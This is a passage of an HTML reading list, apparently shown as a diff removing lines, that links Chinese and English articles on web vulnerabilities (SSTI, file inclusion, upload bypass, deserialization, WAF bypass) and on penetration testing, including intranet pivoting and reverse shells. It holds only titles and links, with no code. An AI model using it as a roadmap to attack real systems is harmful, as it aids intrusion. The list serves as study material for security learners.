-<li><a href="http://www.freebuf.com/articles/web/88768.html" target="_blank" rel="external">乱弹Flask注入</a></li>
-<li><a href="http://www.freebuf.com/vuls/83999.html" target="_blank" rel="external">服务端模板注入攻击 （SSTI）之浅析 </a></li>
-<li><a href="https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/" target="_blank" rel="external">Exploring SSTI in Flask/Jinja2</a></li>
-<li><a href="http://www.freebuf.com/articles/web/136118.html" target="_blank" rel="external">Flask Jinja2开发中遇到的的服务端注入问题研究</a></li>
-<li><a href="http://www.freebuf.com/articles/web/136180.html" target="_blank" rel="external">FlaskJinja2 开发中遇到的的服务端注入问题研究 II</a></li>
-<li><a href="https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/" target="_blank" rel="external">Exploring SSTI in Flask/Jinja2, Part II</a></li>
-<li><a href="https://nvisium.com/blog/2015/12/07/injecting-flask/" target="_blank" rel="external">Injecting Flask</a></li>
-<li><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf" target="_blank" rel="external">Server-Side Template Injection: RCE for the modern webapp</a></li>
-<li><a href="https://sethsec.blogspot.jp/2016/11/exploiting-python-code-injection-in-web.html" target="_blank" rel="external">Exploiting Python Code Injection in Web Applications</a></li>
-<li><a href="http://rickgray.me/2016/02/24/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates.html" target="_blank" rel="external">利用 Python 特性在 Jinja2 模板中执行任意代码</a></li>
-<li><a href="https://virusdefender.net/index.php/archives/761/" target="_blank" rel="external">Python 模板字符串与模板注入</a></li>
-</ul>
-<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><ul>
-<li><a href="http://www.polaris-lab.com/index.php/archives/254/" target="_blank" rel="external">PHP Code Injection Analysis</a></li>
-<li><a href="http://doc.ph0en1x.com/wooyun_drops/%E5%88%A9%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8FLD_PRELOAD%E6%9D%A5%E7%BB%95%E8%BF%87php%20disable_function%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4.html" target="_blank" rel="external">    利用环境变量LD_PRELOAD来绕过php disable_function执行系统命令</a></li>
-<li><a href="http://blog.nsfocus.net/hack-php-mail-additional_parameters/" target="_blank" rel="external">Hack PHP mail additional_parameters</a></li>
-<li><a href="http://bobao.360.cn/learning/detail/3818.html" target="_blank" rel="external">详细解析PHP mail()函数漏洞利用技巧</a></li>
-<li><a href="http://bobao.360.cn/learning/detail/3809.html" target="_blank" rel="external">在PHP应用程序开发中不正当使用mail()函数引发的血案</a></li>
-<li><a href="https://www.cdxy.me/?p=765" target="_blank" rel="external">BigTree CMS - Bypass CSRF filter and execute code with PHPMailer</a></li>
-<li><a href="http://www.mottoin.com/97678.html" target="_blank" rel="external">基于时间反馈的RCE</a></li>
-<li><a href="http://bobao.360.cn/learning/detail/3609.html" target="_blank" rel="external">正则表达式使用不当引发的系统命令执行漏洞</a></li>
-</ul>
-<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><ul>
-<li><a href="https://l.avala.mp/?p=241" target="_blank" rel="external">Turning LFI into RFI</a></li>
-<li><a href="http://wooyun.jozxing.cc/static/drops/tips-3827.html" target="_blank" rel="external">PHP文件包含漏洞总结</a></li>
-<li><a href="http://bobao.360.cn/learning/detail/3873.html" target="_blank" rel="external">常见文件包含发生场景与防御</a></li>
-<li><a href="http://bobao.360.cn/learning/detail/3871.html" target="_blank" rel="external">基于云端的本地文件包含漏洞</a></li>
-<li><a href="https://bl4ck.in/tricks/2015/06/10/zip%E6%88%96phar%E5%8D%8F%E8%AE%AE%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6.html" target="_blank" rel="external">zip或phar协议包含文件</a></li>
-<li><a href="http://drops.blbana.cc/2016/08/12/e6-96-87-e4-bb-b6-e5-8c-85-e5-90-ab-e6-bc-8f-e6-b4-9e/" target="_blank" rel="external">文件包含漏洞 一</a></li>
-<li><a href="http://drops.blbana.cc/2016/12/03/e6-96-87-e4-bb-b6-e5-8c-85-e5-90-ab-e6-bc-8f-e6-b4-9e-ef-bc-88-e4-ba-8c-ef-bc-89/" target="_blank" rel="external">文件包含漏洞 二</a></li>
-</ul>
-<h2 id="文件上传-解析漏洞"><a href="#文件上传-解析漏洞" class="headerlink" title="文件上传 / 解析漏洞"></a>文件上传 / 解析漏洞</h2><ul>
-<li><a href="https://xianzhi.aliyun.com/forum/read/458.html" target="_blank" rel="external">我的WafBypass之道（upload篇）</a></li>
-<li><a href="http://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/" target="_blank" rel="external">文件上传漏洞（绕过姿势） </a></li>
-<li><a href="http://thief.one/2016/09/21/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">服务器解析漏洞 </a></li>
-<li><a href="https://masterxsec.github.io/2017/04/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/" target="_blank" rel="external">文件上传总结 </a></li>
-<li><a href="http://www.cnnetarmy.com/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/" target="_blank" rel="external">文件上传绕过姿势总结</a></li>
-<li><a href="https://www.hackfun.org/pentest/make-the-most-possible-analysis-of-the-source-code-and-exploit-the-vulnerability.html" target="_blank" rel="external">尽最大可能分析上传源码及漏洞利用方式</a></li>
-<li><a href="https://xianzhi.aliyun.com/forum/read/224.html" target="_blank" rel="external">从XSSer的角度测试上传文件功能</a></li>
-<li><a href="http://wooyun.jozxing.cc/static/drops/papers-1957.html" target="_blank" rel="external">代码审计之逻辑上传漏洞挖掘</a></li>
-<li><a href="https://bbs.ichunqiu.com/thread-23193-1-1.html?from=sec" target="_blank" rel="external">渗透测试方法论之文件上传</a></li>
-</ul>
-<h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><ul>
-<li><a href="http://wooyun.jozxing.cc/static/drops/papers-1957.html" target="_blank" rel="external">代码审计之逻辑上传漏洞挖掘</a></li>
-<li><a href="http://bobao.360.cn/learning/detail/3769.html" target="_blank" rel="external">逻辑至上——内含各种酷炫姿势</a></li>
-<li><a href="http://www.freebuf.com/vuls/112339.html" target="_blank" rel="external">Web安全测试中常见逻辑漏洞解析（实战篇）</a></li>
-<li><a href="https://mp.weixin.qq.com/s/Lynmqd_ieEoNJ3mmyv9eQQ" target="_blank" rel="external">逻辑漏洞之密码重置 </a></li>
-<li><a href="https://mp.weixin.qq.com/s/w22omfxO8vU6XzixXWmBxg" target="_blank" rel="external">逻辑漏洞之支付漏洞</a></li>
-<li><a href="https://mp.weixin.qq.com/s/ChiXtcrEyQeLkGOkm4PTog" target="_blank" rel="external">逻辑漏洞之越权访问</a></li>
-<li><a href="http://wooyun.jozxing.cc/static/drops/web-5048.html" target="_blank" rel="external">密码找回逻辑漏洞总结</a></li>
-<li><a href="http://wooyun.jozxing.cc/static/drops/papers-2035.html" target="_blank" rel="external">一些常见的重置密码漏洞分析整理</a></li>
-<li><a href="http://docs.ioin.in/writeup/blog.heysec.org/_archives_643/index.html" target="_blank" rel="external">密码逻辑漏洞小总结</a></li>
-<li><a href="https://bbs.ichunqiu.com/thread-21161-1-1.html" target="_blank" rel="external">漏洞挖掘之逻辑漏洞挖掘</a></li>
-<li><a href="https://tom0li.github.io/2017/07/17/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/" target="_blank" rel="external">tom0li: 逻辑漏洞小结</a></li>
-</ul>
-<h2 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h2><ul>
-<li><a href="http://www.au1ge.xyz/2017/08/09/web%E4%B9%8B%E5%9B%B0%E7%AC%94%E8%AE%B0/" target="_blank" rel="external">Web之困笔记</a></li>
-<li><a href="http://www.mottoin.com/95749.html" target="_blank" rel="external">常见Web源码泄露总结</a></li>
-<li><a href="http://www.ms509.com/?p=718" target="_blank" rel="external">Github信息泄露升级版案例</a></li>
-<li><a href="https://ricterz.me/posts/Hacking%20iSCSI" target="_blank" rel="external">Hacking iSCSI</a></li>
-</ul>
-<h3 id="RPO-relative-path-overwrite"><a href="#RPO-relative-path-overwrite" class="headerlink" title="RPO(relative path overwrite)"></a>RPO(relative path overwrite)</h3><ul>
-<li><a href="https://xianzhi.aliyun.com/forum/read/1527.html?fpage=2" target="_blank" rel="external">初探 Relative Path Overwrite</a></li>
-<li><a href="http://blog.portswigger.net/2015/02/prssi.html" target="_blank" rel="external">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li>
-<li><a href="http://www.thespanner.co.uk/2014/03/21/rpo/" target="_blank" rel="external">RPO</a></li>
-<li><a href="http://www.mbsd.jp/Whitepaper/rpo.pdf" target="_blank" rel="external">A few RPO exploitation techniques</a></li>
-</ul>
-<h3 id="Web-Cache"><a href="#Web-Cache" class="headerlink" title="Web Cache"></a>Web Cache</h3><ul>
-<li><a href="http://bobao.360.cn/learning/detail/3828.html" target="_blank" rel="external">浅析 Web Cache 欺骗攻击</a></li>
-</ul>
-<h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><ul>
-<li><a href="https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html" target="_blank" rel="external">利用redis写webshell</a></li>
-<li><a href="http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/" target="_blank" rel="external">Redis 未授权访问配合 SSH key 文件利用分析</a></li>
-<li><a href="https://xianzhi.aliyun.com/forum/read/750.html" target="_blank" rel="external">redis未授权访问漏洞利用总结</a>。</li>
-</ul>
-<h2 id="PHP相关"><a href="#PHP相关" class="headerlink" title="PHP相关"></a>PHP相关</h2><h3 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h3><ul>
-<li><a href="http://bobao.360.cn/learning/detail/3486.html" target="_blank" rel="external">从弱类型利用以及对象注入到SQL注入</a></li>
-<li><a href="http://bobao.360.cn/learning/detail/2924.html" target="_blank" rel="external">PHP中“＝＝”运算符的安全问题</a></li>
-<li><a href="http://blog.spoock.com/2016/06/25/weakly-typed-security/" target="_blank" rel="external">PHP弱类型安全问题总结 </a></li>
-<li><a href="http://wooyun.jozxing.cc/static/drops/tips-4483.html" target="_blank" rel="external">浅谈PHP弱类型安全</a></li>
-<li><a href="http://wooyun.jozxing.cc/static/drops/tips-7679.html" target="_blank" rel="external">php比较操作符的安全问题</a></li>
-</ul>
-<h3 id="随机数问题"><a href="#随机数问题" class="headerlink" title="随机数问题"></a>随机数问题</h3><ul>
-<li><a href="http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/" target="_blank" rel="external">Cracking PHP rand()</a></li>
-<li><a href="http://5alt.me/2017/06/php%E9%87%8C%E7%9A%84%E9%9A%8F%E6%9C%BA%E6%95%B0/" target="_blank" rel="external">php里的随机数</a></li>
-<li><a href="http://www.openwall.com/php_mt_seed/" target="_blank" rel="external">php_mt_seed - PHP mt_rand() seed cracker</a></li>
-<li><a href="http://www.mscs.dal.ca/~selinger/random/" target="_blank" rel="external">The GLIBC random number generator</a></li>
-<li><a href="https://github.com/wonderkun/CTF_web/blob/master/web500-2/writeup.pdf" target="_blank" rel="external">一道伪随机数的CTF题</a></li>
-</ul>
-<h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><ul>
-<li><a href="www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a></li>
-<li><a href="http://lorexxar.cn/2016/09/14/php-wei/" target="_blank" rel="external">php 伪协议</a></li>
-<li><a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="external">利用 Gopher 协议拓展攻击面</a></li>
-<li><a href="https://www.bodkin.ren/?p=902" target="_blank" rel="external">PHP伪协议之 Phar 协议（绕过包含）</a></li>
-<li><a href="http://www.4o4notfound.org/index.php/archives/31/" target="_blank" rel="external">PHP伪协议分析与应用</a></li>
-<li><a href="http://www.cnblogs.com/LittleHann/p/3665062.html" target="_blank" rel="external">LFI、RFI、PHP封装协议安全问题学习</a></li>
-</ul>
-<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><ul>
-<li><a href="bobao.360.cn/learning/detail/4122.html">PHP反序列化漏洞</a></li>
-<li><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">浅谈php反序列化漏洞 </a></li>
-<li><a href="http://bobao.360.cn/learning/detail/3193.html" target="_blank" rel="external">PHP反序列化漏洞成因及漏洞挖掘技巧与案例</a></li>
-</ul>
-<h3 id="php-mail-header-injection"><a href="#php-mail-header-injection" class="headerlink" title="php mail header injection"></a>php mail header injection</h3><ul>
-<li><a href="https://www.acunetix.com/blog/articles/email-header-injection/" target="_blank" rel="external">What is Email Header Injection?</a></li>
-<li><a href="http://resources.infosecinstitute.com/email-injection/" target="_blank" rel="external">PHP Email Injection Example</a></li>
-</ul>
-<h3 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h3><ul>
-<li><a href="http://wonderkun.cc/index.html/?p=626" target="_blank" rel="external">php &amp; apache2 &amp;操作系统之间的一些黑魔法</a></li>
-<li><a href="http://blog.th3s3v3n.xyz/2016/05/01/bin/2016-5-1-php%E5%86%85%E5%AD%98%E7%A0%B4%E5%9D%8F%E6%BC%8F%E6%B4%9Eexp%E7%BC%96%E5%86%99%E5%92%8C%E7%A6%81%E7%94%A8%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/" target="_blank" rel="external">php内存破坏漏洞exp编写和禁用函数绕过</a></li>
-<li><a href="http://blog.th3s3v3n.xyz/2016/11/20/web/%E6%8C%96%E6%8E%98PHP%E7%A6%81%E7%94%A8%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/" target="_blank" rel="external">挖掘PHP禁用函数绕过利用姿势</a></li>
-<li><a href="http://wooyun.jozxing.cc/static/drops/tips-3424.html" target="_blank" rel="external">.user.ini文件构成的PHP后门</a></li>
-</ul>
-<h3 id="php代码审计"><a href="#php代码审计" class="headerlink" title="php代码审计"></a>php代码审计</h3><ul>
-<li><a href="http://wooyun.jozxing.cc/static/drops/papers-4544.html" target="_blank" rel="external">论PHP常见的漏洞</a></li>
-<li><a href="http://www.freebuf.com/articles/rookie/143554.html" target="_blank" rel="external">浅谈代码审计入门实战：某博客系统最新版审计之旅 </a></li>
-<li><a href="http://www.am0s.com/ctf/200.html" target="_blank" rel="external">ctf中的php代码审计技巧</a></li>
-<li><a href="http://docs.ioin.in/writeup/www.91ri.org/_15074_html/index.html" target="_blank" rel="external">PHP代码审计tips</a></li>
-<li><a href="http://docs.ioin.in/writeup/blog.heysec.org/_archives_170/index.html" target="_blank" rel="external">代码审计之文件越权和文件上传搜索技巧</a></li>
-<li><a href="http://wiki.ioin.in/post/group/6Rb" target="_blank" rel="external">PHP代码审计入门集合</a></li>
-<li><a href="http://phantom0301.cc/2017/06/06/codeaudit/" target="_blank" rel="external">PHP代码审计学习</a></li>
-<li><a href="http://wooyun.jozxing.cc/static/drops/tips-838.html" target="_blank" rel="external">PHP漏洞挖掘思路+实例</a></li>
-<li><a href="http://wooyun.jozxing.cc/static/drops/tips-858.html" target="_blank" rel="external">PHP漏洞挖掘思路+实例 第二章</a></li>
-<li><a href="http://www.freebuf.com/articles/rookie/143554.html" target="_blank" rel="external">浅谈代码审计入门实战：某博客系统最新版审计之旅 </a></li>
-</ul>
-<h2 id="java-Web"><a href="#java-Web" class="headerlink" title="java-Web"></a>java-Web</h2><h3 id="反序列"><a href="#反序列" class="headerlink" title="反序列"></a>反序列</h3><ul>
-<li><a href="http://bobao.360.cn/learning/detail/4267.html" target="_blank" rel="external">如何攻击Java反序列化过程</a></li>
-<li><a href="https://www.vulbox.com/knowledge/detail/?id=11" target="_blank" rel="external">深入理解JAVA反序列化漏洞</a></li>
-<li><a href="https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/" target="_blank" rel="external">Attacking Java Deserialization</a></li>
-<li><a href="http://bobao.360.cn/learning/detail/4118.html" target="_blank" rel="external">jackson反序列化详细分析</a></li>
-</ul>
-<h3 id="Struct2"><a href="#Struct2" class="headerlink" title="Struct2"></a>Struct2</h3><ul>
-<li><a href="http://www.zerokeeper.com/vul-analysis/struts2-command-execution-series-review.html" target="_blank" rel="external">Struts2 命令执行系列回顾</a></li>
-</ul>
-<h3 id="java-Web代码审计"><a href="#java-Web代码审计" class="headerlink" title="java-Web代码审计"></a>java-Web代码审计</h3><ul>
-<li><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=22170&amp;highlight=Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%BF%9E%E8%BD%BD" target="_blank" rel="external">Java代码审计连载之—SQL注入</a></li>
-<li><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=23587&amp;highlight=Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%BF%9E%E8%BD%BD" target="_blank" rel="external">Java代码审计连载之—任意文件下载</a></li>
-<li><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=22875&amp;highlight=Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%BF%9E%E8%BD%BD" target="_blank" rel="external">Java代码审计连载之—XSS</a></li>
-<li><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=25475&amp;highlight=Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%BF%9E%E8%BD%BD" target="_blank" rel="external">Java代码审计连载之—添油加醋</a></li>
-</ul>
-<h3 id="其他-2"><a href="#其他-2" class="headerlink" title="其他"></a>其他</h3><ul>
-<li><a href="https://mp.weixin.qq.com/s/WT1EXEryUGGqHQpSi959xw" target="_blank" rel="external">层层放大java审计的攻击面 </a></li>
-<li><a href="https://mp.weixin.qq.com/s?__biz=MzIzMzgxOTQ5NA==&amp;mid=2247483954&amp;idx=1&amp;sn=418b7e55b16c717ee5140af990298e22&amp;chksm=e8fe9e3bdf89172d0670690060944bf2434cc2d2e8fba4477711299a0775cf3735a2022c0778#rd" target="_blank" rel="external">以Java的视角来聊聊SQL注入 </a></li>
-<li><a href="http://mp.weixin.qq.com/s?__biz=MzIzMzgxOTQ5NA==&amp;mid=100000340&amp;idx=1&amp;sn=6ca4ec15ef6338daf1d4a907351d7c08&amp;chksm=68fe9e5d5f89174b44fd0cae2e3d5c0018859d3d1dc6d60a2e16dcde34499ba224d6ea17a982#rd" target="_blank" rel="external">站在Java的视角，深度分析防不胜防的小偷——“XSS” </a></li>
-<li><a href="https://mp.weixin.qq.com/s?__biz=MzIzMzgxOTQ5NA==&amp;mid=100000318&amp;idx=1&amp;sn=9011af3e3968e0d87499605ef1a68291&amp;chksm=68fe9e375f8917213297855bd9e1ab1203ae4c9b0b5ca351de7b2c0f7a7799bd1f4843cd13f4#rd" target="_blank" rel="external">你的 Java web 配置安全吗？ </a></li>
-<li><a href="https://xianzhi.aliyun.com/forum/read/1904.html" target="_blank" rel="external">Java代码审计PPT </a></li>
-<li><a href="https://github.com/ilmila/springcss-cve-2014-3625/tree/master/src" target="_blank" rel="external">spring任意文件读取</a></li>
-</ul>
-<h2 id="python-Web"><a href="#python-Web" class="headerlink" title="python-Web"></a>python-Web</h2><ul>
-<li><a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html" target="_blank" rel="external">Python 格式化字符串漏洞（Django为例）</a></li>
-<li><a href="http://www.venenof.com/index.php/archives/360/" target="_blank" rel="external">format注入</a></li>
-<li><a href="http://lucumr.pocoo.org/2016/12/29/careful-with-str-format/" target="_blank" rel="external">Be Careful with Python’s New-Style String Format</a></li>
-<li><a href="http://www.tuicool.com/articles/2iIj2eR" target="_blank" rel="external">Python urllib HTTP头注入漏洞</a></li>
-<li><a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="external">Hack Redis via Python urllib HTTP Header Injection</a></li>
-<li><a href="http://www.0aa.me/index.php/archives/123/" target="_blank" rel="external">Python Waf黑名单过滤下的一些Bypass思路</a></li>
-<li><a href="https://mp.weixin.qq.com/s?__biz=MzIzOTQ5NjUzOQ==&amp;mid=2247483665&amp;idx=1&amp;sn=4b18de09738fdc5291634db1ca2dd55a" target="_blank" rel="external">Python Sandbox Bypass</a></li>
-<li><a href="https://github.com/python-security/pyt" target="_blank" rel="external">pyt: 针对 Python 应用程序的源码静态分析工具</a></li>
-</ul>
-<h2 id="Node-js"><a href="#Node-js" class="headerlink" title="Node-js"></a>Node-js</h2><ul>
-<li><a href="http://www.websecgeeks.com/2017/04/pentesting-nodejs-application-nodejs.html" target="_blank" rel="external">Pentesting Node.js Application : Nodejs Application Security(需翻墙)</a></li>
-<li><a href="https://bbs.ichunqiu.com/thread-21810-1-1.html?from=sec" target="_blank" rel="external">从零开始学习渗透Node.js应用程序 </a></li>
-</ul>
-<h2 id="WAF相关"><a href="#WAF相关" class="headerlink" title="WAF相关"></a>WAF相关</h2><ul>
-<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="external">牛逼牛逼的payload和bypass总结</a></li>
-<li><a href="http://www.mottoin.com/100887.html" target="_blank" rel="external">WAF绕过参考资料</a></li>
-<li><a href="http://www.freebuf.com/articles/web/136723.html" target="_blank" rel="external">浅谈WAF绕过技巧</a></li>
-<li><a href="https://xianzhi.aliyun.com/forum/read/753.html?fpage=6" target="_blank" rel="external">addslashes防注入的绕过案例</a></li>
-<li><a href="https://xianzhi.aliyun.com/forum/read/553.html?fpage=8" target="_blank" rel="external">浅谈json参数解析对waf绕过的影响</a></li>
-<li><a href="http://weibo.com/ttarticle/p/show?id=2309404007261092631700" target="_blank" rel="external">WAF攻防研究之四个层次Bypass WAF</a></li>
-<li><a href="http://www.sohu.com/a/110066439_468673" target="_blank" rel="external">使用HTTP头去绕过WAF </a></li>
-<li><a href="https://www.inforsec.org/wp/?p=1993" target="_blank" rel="external">会找漏洞的时光机: Pinpointing Vulnerabilities</a></li>
-</ul>
-<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><h2 id="Course"><a href="#Course" class="headerlink" title="Course"></a>Course</h2><ul>
-<li><a href="http://bobao.360.cn/learning/detail/3741.html" target="_blank" rel="external">Web Service 渗透测试从入门到精通</a></li>
-<li><a href="https://www.processon.com/view/583e8834e4b08e31357bb727" target="_blank" rel="external">渗透标准</a></li>
-<li><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/" target="_blank" rel="external">Penetration Testing Tools Cheat Sheet</a></li>
-</ul>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul>
-<li><a href="https://mp.weixin.qq.com/s/qz0b42DKhgo1sfitcUKhtQ" target="_blank" rel="external">看我如何收集全网IP的whois信息 </a></li>
-<li><a href="http://www.freebuf.com/articles/web/142767.html" target="_blank" rel="external">浅谈Web渗透测试中的信息收集 </a></li>
-<li><a href="http://www.4hou.com/penetration/6850.html" target="_blank" rel="external">渗透测试教程：如何侦查目标以及收集信息？</a></li>
-<li><a href="weibo.com/ttarticle/p/show?id=2309404088584863883789">本屌的web漏洞扫描器思路 技巧总结（域名信息收集篇）</a></li>
-<li><a href="http://www.91ri.org/17001.html" target="_blank" rel="external">子域名的艺术</a></li>
-<li><a href="http://bobao.360.cn/learning/detail/4119.html" target="_blank" rel="external">实例演示如何科学的进行子域名收集</a></li>
-<li><a href="http://thief.one/2017/05/19/1/" target="_blank" rel="external">【渗透神器系列】搜索引擎 </a></li>
-<li><a href="https://xianzhi.aliyun.com/forum/read/805.html" target="_blank" rel="external">域渗透基础简单信息收集（基础篇）</a></li>
-<li><a href="http://docs.ioin.in/writeup/www.mottoin.com/_92978_html/index.html" target="_blank" rel="external">内网渗透定位技术总结</a></li>
-<li><a href="https://www.secpulse.com/archives/51527.html" target="_blank" rel="external">后渗透攻防的信息收集</a></li>
-<li><a href="http://www.mottoin.com/99951.html" target="_blank" rel="external">安全攻城师系列文章－敏感信息收集</a></li>
-<li><a href="http://www.mottoin.com/101362.html" target="_blank" rel="external">子域名枚举的艺术</a></li>
-<li><a href="https://mp.weixin.qq.com/s/ardCYdZzaSjvSIZiFraWGA" target="_blank" rel="external">论二级域名收集的各种姿势</a></li>
-<li><a href="https://xianzhi.aliyun.com/forum/read/451.html?fpage=2" target="_blank" rel="external">我眼中的渗透测试信息搜集</a></li>
-<li><a href="https://xianzhi.aliyun.com/forum/read/1675.html" target="_blank" rel="external">大型目标渗透－01入侵信息搜集</a></li>
-</ul>
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><ul>
-<li><a href="https://mp.weixin.qq.com/s/VJBnXq3--0HBD7eVeifOKA" target="_blank" rel="external">【玩转Linux系统】Linux内网渗透 </a></li>
-<li><a href="http://www.4hou.com/penetration/7016.html" target="_blank" rel="external">渗透测试指南之域用户组的范围</a></li>
-<li><a href="http://mp.weixin.qq.com/s/l-Avt72ajCIo5GdMEwVx7A" target="_blank" rel="external">内网主机发现技巧补充</a></li>
-<li><a href="https://mp.weixin.qq.com/s?__biz=MzA3Mzk1MDk1NA==&amp;mid=2651903919&amp;idx=1&amp;sn=686cc53137aa9e8ec323dda1e54a2c23" target="_blank" rel="external">Linux 端口转发特征总结 </a></li>
-<li><a href="http://rcoil.me/2017/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" target="_blank" rel="external">内网渗透（持续更新） </a></li>
-<li><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html" target="_blank" rel="external">实战 SSH 端口转发</a></li>
-<li><a href="http://bobao.360.cn/learning/detail/3545.html" target="_blank" rel="external">多重转发渗透隐藏内网</a></li>
-<li><a href="http://www.03sec.com/3141.shtml" target="_blank" rel="external">内网转发姿势</a></li>
-<li><a href="https://mp.weixin.qq.com/s/EWL9-AUB_bTf7pU4S4A2zg" target="_blank" rel="external">内网转发的工具</a></li>
-<li><a href="http://www.03sec.com/3140.shtml" target="_blank" rel="external">Linux 下多种反弹 shell 方法</a></li>
-<li><a href="http://wolvez.club/?p=458" target="_blank" rel="external">php 反弹shell</a></li>
-<li><a href="https://klionsec.github.io/2017/08/05/ew-tunnel/" target="_blank" rel="external">利用ew轻松穿透多级目标内网</a></li>
-<li><a href="https://bl4ck.in/penetration/2017/03/20/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%9D%82%E8%B0%88.html" target="_blank" rel="external">windows内网渗透杂谈</a></li>
-<li><a href="http://docs.ioin.in/writeup/www.mottoin.com/_89413_html/index.html" target="_blank" rel="external">Windows域横向渗透</a></li>
-<li><a href="http://blog.neargle.com/SecNewsBak/drops/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E8%BD%AC%E5%8F%91%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93.html" target="_blank" rel="external">内网渗透中转发工具总结</a></li>
-<li><a href="http://bobao.360.cn/learning/detail/3683.html" target="_blank" rel="external">内网渗透思路整理与工具使用</a></li>
-<li><a href="http://www.freebuf.com/sectool/125237.html" target="_blank" rel="external">Cobalt strike在内网渗透中的使用 </a></li>
-<li><a href="http://x95.org/archives/reverse-socks5-proxy.html" target="_blank" rel="external">反向socks5代理(windows版)</a></li>
-<li><a href="http://www.mottoin.com/89355.html" target="_blank" rel="external">Windows渗透基础</a></li>
-<li><a href="https://xianzhi.aliyun.com/forum/read/768.html" target="_blank" rel="external">通过双重跳板漫游隔离内网</a></li>
-<li><a href="https://artkond.com/2017/03/23/pivoting-guide/" target="_blank" rel="external">A Red Teamer’s guide to pivoting</a></li>
-<li><a href="https://mp.weixin.qq.com/s/l-0sWU4ijMOQWqRgsWcNFA" target="_blank" rel="external">穿越边界的姿势 </a></li>
-<li><a href="https://xianzhi.aliyun.com/forum/read/1715.html" target="_blank" rel="external">内网端口转发及穿透</a></li>
-<li><a href="http://www.4hou.com/technology/3143.html" target="_blank" rel="external">秘密渗透内网——利用 DNS 建立 VPN 传输隧道</a></li>
-<li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="external">Reverse Shell Cheat Sheet</a></li>
-</ul>
-<h2 id="渗透实战"><a href="#渗透实战" class="headerlink" title="渗透实战"></a>渗透实战</h2><ul>
-<li><a href="http://www.freebuf.com/news/142680.html" target="_blank" rel="external">挖洞经验 | 看我如何综合利用4个漏洞实现GitHub Enterprise远程代码执行 </a></li>
-<li><a href="http://bobao.360.cn/learning/detail/4113.html" target="_blank" rel="external">Splash SSRF到获取内网服务器ROOT权限</a></li>
-<li><a href="http://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html" target="_blank" rel="external">Pivoting from blind SSRF to RCE with HashiCorp Consul</a></li>
